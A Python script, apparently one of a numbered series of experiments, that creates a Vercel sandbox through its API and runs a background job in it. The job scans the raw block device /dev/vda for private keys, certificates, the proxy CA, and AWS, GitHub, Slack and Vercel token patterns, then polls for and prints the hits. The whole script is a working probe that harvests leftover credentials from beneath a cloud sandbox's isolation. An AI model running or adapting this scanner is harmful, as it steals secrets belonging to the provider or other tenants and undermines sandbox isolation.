# 实验J125: 后台全盘扫描(v2) — 私钥/凭据特征, wait=False + timeout>=100
# 修复: j124 后台启动 400 (timeout 需 >=100); 扫描特征扩充(AKIA/ghp_/vcp_/OPENSSH等)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300, args=None):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj125"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

SCAN = r"""
import os, sys, time, hashlib, re
start = int(sys.argv[1]) if len(sys.argv) > 1 else 0
end = int(sys.argv[2]) if len(sys.argv) > 2 else 35433480192
out = sys.argv[3] if len(sys.argv) > 3 else "/root/scan_out.txt"
feats = [
    (b"-----BEGIN PRIVATE KEY-----", "PKCS8"),
    (b"-----BEGIN RSA PRIVATE KEY-----", "RSA"),
    (b"-----BEGIN EC PRIVATE KEY-----", "EC"),
    (b"-----BEGIN ENCRYPTED PRIVATE KEY-----", "ENCR"),
    (b"-----BEGIN OPENSSH PRIVATE KEY-----", "OPENSSH"),
    (b"-----BEGIN CERTIFICATE-----", "CERT"),
    (b"PRIVATE KEY-----", "KEYGENERIC"),
    (b"AKIA", "AWSKEY"),
    (b"ghp_", "GHTOKEN"),
    (b"xoxb-", "SLACK"),
    (b"vcp_", "VCPTOKEN"),
    (b"BEGIN RSA PUBLIC KEY", "RSAPUB"),
]
anchor = None
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        anchor = d[:256]
        break
    except Exception:
        pass
BS = 8 * 1024 * 1024
f = open("/dev/vda", "rb", buffering=0)
f.seek(start)
pos = start
t0 = time.time()
hits = []
last_prog = time.time()
try:
    while pos < end:
        chunk = f.read(BS)
        if not chunk:
            break
        pos += len(chunk)
        for feat, name in feats:
            i = chunk.find(feat)
            if i >= 0:
                off = pos - len(chunk) + i
                hits.append((off, name))
                print("HIT %d %s" % (off, name), flush=True)
        if anchor:
            i = chunk.find(anchor)
            if i >= 0:
                off = pos - len(chunk) + i
                hits.append((off, "ANCHOR"))
                print("HIT %d ANCHOR" % off, flush=True)
        now = time.time()
        if now - last_prog >= 15:
            print("PROGRESS %.2f GB %.0fs" % (pos / 2**30, now - t0), flush=True)
            last_prog = now
finally:
    f.close()
print("SCAN_TOTAL %d hits in %.1fs" % (len(hits), time.time() - t0), flush=True)
print("SCAN_DONE", flush=True)
"""
run_cmd(sid, """
open("/root/scan.py", "w").write(%r)
print("written", len(%r))
""" % (SCAN, SCAN), "write-scan")

# 后台启动 (wait=False, timeout>=100)
print("\n-- launching background scan --", flush=True)
body = {"command": "sh", "args": ["-c", "nohup python3 /root/scan.py 0 35433480192 /root/scan_out.txt > /root/launch.log 2>&1 & echo BG_PID=$!"],
        "wait": False, "logs": True, "timeout": 120}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("launch:", c, r[:300], flush=True)

# 轮询 (每 30 秒, 最多 12 次 = 6 分钟)
for i in range(12):
    time.sleep(30)
    body = {"command": "sh", "args": ["-c", "wc -l /root/scan_out.txt 2>/dev/null; grep -c SCAN_DONE /root/scan_out.txt 2>/dev/null; tail -3 /root/scan_out.txt 2>/dev/null"],
            "wait": True, "logs": True, "timeout": 120}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
        except Exception:
            out += line
    print(f"[poll {i}] {out.strip()!r}", flush=True)
    if "SCAN_DONE" in out:
        break

# 输出完整结果
print("\n== full scan_out.txt ==", flush=True)
body = {"command": "sh", "args": ["-c", "cat /root/scan_out.txt | head -200"], "wait": True, "logs": True, "timeout": 120}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="", flush=True)
        elif d.get("stream") == "command":
            print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
    except Exception:
        print(line[:300], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
